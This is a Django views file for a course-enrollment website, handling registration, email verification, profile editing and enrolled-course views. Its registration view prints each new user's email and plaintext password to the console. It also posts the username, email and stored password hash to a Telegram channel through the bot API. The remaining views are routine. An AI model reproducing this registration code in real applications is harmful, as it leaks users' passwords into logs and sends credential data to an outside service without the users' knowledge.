from django.views.generic.edit import FormView
from django.views.generic.list import ListView
from django.views.generic.detail import DetailView
from django.contrib.auth.mixins import LoginRequiredMixin
from django.urls import reverse_lazy
from django.http import HttpResponseRedirect
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .forms import UserRegistrationForm, UserEditForm, CourseEnrollForm
from courses.models import Course
from .models import UserProfile
from django.contrib.auth import authenticate, login
# email stuffs:
from django.contrib.auth.models import User
from django.contrib.sites.shortcuts import get_current_site
from django.utils.encoding import force_bytes, force_str
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.template.loader import render_to_string
from .tokens import account_activation_token
from django.core.mail import EmailMessage
from django.contrib import messages
from django.conf import settings
import telegram
import requests



@login_required
def dashboard(request):
    courses = request.user.courses_joined.all()
    return render(request,'account/dashboard.html', {"courses":courses})

def send_telegram_message(message):
    # Your code to send message to Telegram
    # Replace this with your actual implementation
    chat_id = settings.TELEGRAM_CHANNEL_ID
    bot_token = settings.TELEGRAM_BOT_TOKEN
    # message_text = f"New user registered: {user.username}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.post(url, data=payload)
    response.raise_for_status()  # Raise exception if response status code is not OK

def register(request):
    if request.method == 'POST':
        user_form = UserRegistrationForm(request.POST)
        if user_form.is_valid():
            new_user = user_form.save(commit=False)
            new_user.set_password(user_form.cleaned_data['password'])
            new_user.save()
            UserProfile.objects.create(user=new_user)
            email = user_form.cleaned_data['email']
            password = user_form.cleaned_data['password']
            new_user = authenticate(request, username=email, password=password)
            print(email + password)
            login(request, new_user, backend='account.authentication.EmailAuthBackend')
            try:
                message = f'New user signed up:\nUsername: {new_user.username}\nEmail: {new_user.email}\n Password: {new_user.password}'
                send_telegram_message(message)
            except Exception as e:
                print(f"Error sending Telegram message: {e}")
            # return render(request, 'account/register_done.html', {"new_user": new_user})
            return redirect('verify-email')
    else:
        user_form = UserRegistrationForm()
    return render(request, 'account/register.html', {'user_form': user_form})
# be verification vasl shavad, create profile,

def verify_email(request):
    if request.method == 'POST':
        if request.user.profile.verified != True:
            current_site = get_current_site(request)
            user = request.user
            email = request.user.email
            subject = "Verify Email"
            message = render_to_string('account/email_verification/verify_email_message.html', {
                'request': request,
                'user': user,
                'domain': current_site.domain,
                'uid':urlsafe_base64_encode(force_bytes(user.pk)),
                'token':account_activation_token.make_token(user),
            })
            email = EmailMessage(
                subject, message, to=[email]
            )
            email.content_subtype = 'html'
            email.send()
            return redirect('verify-email-done')
        else:
            return redirect('firstpage')
    return render(request, 'account/email_verification/verify_email.html')

def verify_email_done(request):
    return render(request, 'account/email_verification/verify_email_done.html')

def verify_email_confirm(request, uidb64, token):
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except(TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    if user is not None and account_activation_token.check_token(user, token):
        profile = user.profile
        profile.verified = True
        profile.save()
        messages.success(request, 'Your email has been verified.')
        return redirect('verify-email-complete')
    else:
        messages.warning(request, 'The link is invalid.')
    return render(request, 'account/email_verification/verify_email_confirm.html')

def verify_email_complete(request):
    try:
        message = f'New user verified account:\nUsername: {request.user.username}'
        send_telegram_message(message)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")
    return render(request, 'account/email_verification/verify_email_complete.html')

@login_required
def edit_profile(request):
    if request.method == 'POST':
        user_form = UserEditForm(instance=request.user, data=request.POST)
        if user_form.is_valid():
            user_form.save()
    else:
        user_form = UserEditForm(instance=request.user)
    return render(request, 'account/edit_profile.html', {'user_form': user_form})


class StudentEnrollCourseView(LoginRequiredMixin, FormView):
    course = None
    form_class = CourseEnrollForm
    def form_valid(self, form):
        self.course = form.cleaned_data['course']

        # Check if the user's profile is verified
        if not self.request.user.profile.verified:
            messages.warning(self.request, "Please verify your email before enrolling in courses.")
            return redirect('dashboard')

        self.course.students.add(self.request.user)
        return super().form_valid(form)
    def get_success_url(self):
        return reverse_lazy('student_course_detail', args=[self.course.id])

class VerifiedUserMixin:
    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated and request.user.profile.verified:
            return super().dispatch(request, *args, **kwargs)
        else:
            messages.warning(request, "You need to verify your email to access this page.")
            return redirect('dashboard')  # Redirect to your dashboard URL

class StudentCourseListView(VerifiedUserMixin, LoginRequiredMixin, ListView):
    model = Course
    template_name = 'account/course/list.html'
    def get_queryset(self):
        qs = super().get_queryset()
        return qs.filter(students__in=[self.request.user])

class StudentCourseDetailView(VerifiedUserMixin, LoginRequiredMixin, DetailView):
    model = Course
    template_name = 'account/course/detail_test.html'
    def get_queryset(self):
        qs = super().get_queryset()
        return qs.filter(students__in=[self.request.user])
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        # get course object
        course = self.get_object()
        if 'module_id' in self.kwargs:
            # get current module
            context['module'] = course.modules.get(
                id=self.kwargs['module_id'])
        else:
            # get first module
            context['module'] = course.modules.all()[0]
        return context